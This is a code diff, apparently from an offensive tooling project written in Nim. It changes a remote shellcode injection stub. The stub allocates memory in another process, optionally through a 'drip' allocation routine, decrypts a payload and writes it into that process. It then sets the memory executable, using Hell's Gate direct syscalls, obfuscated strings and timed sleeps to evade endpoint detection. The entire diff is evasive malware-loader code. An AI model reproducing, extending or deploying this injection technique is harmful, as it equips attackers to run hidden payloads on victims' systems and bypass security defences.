@@ -306,10 +306,14 @@ let ShellcoderemoteinjectStub * = """
                 protectionValue = PAGE_EXECUTE_READWRITE
             
             when defined(AllocateDripStyle):
-                var result: bool = DripAllocate(tProcess, &ds, cast[SIZE_T](friendlycode.len), protectionValue)
-                if result == false:
-                    echo "Fail"
+                ds = DripAllocate(tProcess, cast[SIZE_T](friendlycode.len), friendlycode)
+                if ds == nil:
+                    when defined(verbose):
+                        echo obf("[-] DripAllocation Failed")
                     quit(1)
+                else:
+                    when defined(verbose):
+                        echo obf("[+] DripAllocation Success!")
             else:
                 status = NtAllocateVirtualMemory(tProcess, &ds, 0, &sc_size,MEM_COMMIT,protectionValue)
                 when defined(verbose):
@@ -338,48 +342,50 @@ let ShellcoderemoteinjectStub * = """
                 when defined(verbose):
                     echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                 HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
-
-            ptrEncText = cast[ptr byte](addr encText[0])
-            ptrDecText = cast[ptr byte](addr decText[0])
-            decryptlate()
-
-            status = NtWriteVirtualMemory(
-                tProcess, 
-                ds, 
-                unsafeAddr friendlycode, 
-                sc_size-1, 
-                addr bytesWritten)
-
-            when defined(verbose):
-                echo obf("[*] NtWriteVirtualMemory: "), status
-                echo obf("    \\-- bytes written: "), bytesWritten
-                echo obf("")
             
-            when defined(RX):
-                when defined(Hellsgate):
-                    if getSyscall(ntProtectTable):
-                        syscall = ntProtectTable.wSysCall
-                    else:
-                        when defined(verbose):
-                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
-                when defined(sleepinbetween):
-                    when defined(verbose):
-                        echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
-                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
-                
-                status = NtProtectVirtualMemory(tProcess, &ds, &sc_size, PAGE_EXECUTE_READ, addr oldProtection)
+
+            when not defined(AllocateDripStyle):
+                ptrEncText = cast[ptr byte](addr encText[0])
+                ptrDecText = cast[ptr byte](addr decText[0])
+                decryptlate()
+
+                status = NtWriteVirtualMemory(
+                    tProcess, 
+                    ds, 
+                    unsafeAddr friendlycode, 
+                    sc_size-1, 
+                    addr bytesWritten)
+
                 when defined(verbose):
-                    echo obf("[*] NtProtectVirtualMemory: "), status
-                    if (status == 0):
-                        echo obf("[+] Permissions changed to PAGE_EXECUTE_READ")
-                if(status != 0):
-                    quit(1)
-            
-            when not defined(RX):
-                when defined(sleepinbetween):
+                    echo obf("[*] NtWriteVirtualMemory: "), status
+                    echo obf("    \\-- bytes written: "), bytesWritten
+                    echo obf("")
+                
+                when defined(RX):
+                    when defined(Hellsgate):
+                        if getSyscall(ntProtectTable):
+                            syscall = ntProtectTable.wSysCall
+                        else:
+                            when defined(verbose):
+                                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                    when defined(sleepinbetween):
+                        when defined(verbose):
+                            echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
+                        HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
+                    
+                    status = NtProtectVirtualMemory(tProcess, &ds, &sc_size, PAGE_EXECUTE_READ, addr oldProtection)
                     when defined(verbose):
-                        echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
-                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
+                        echo obf("[*] NtProtectVirtualMemory: "), status
+                        if (status == 0):
+                            echo obf("[+] Permissions changed to PAGE_EXECUTE_READ")
+                    if(status != 0):
+                        quit(1)
+                
+                when not defined(RX):
+                    when defined(sleepinbetween):
+                        when defined(verbose):
+                            echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
+                        HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
             
             when defined(QueueAPC):
                 when defined(Hellsgate):
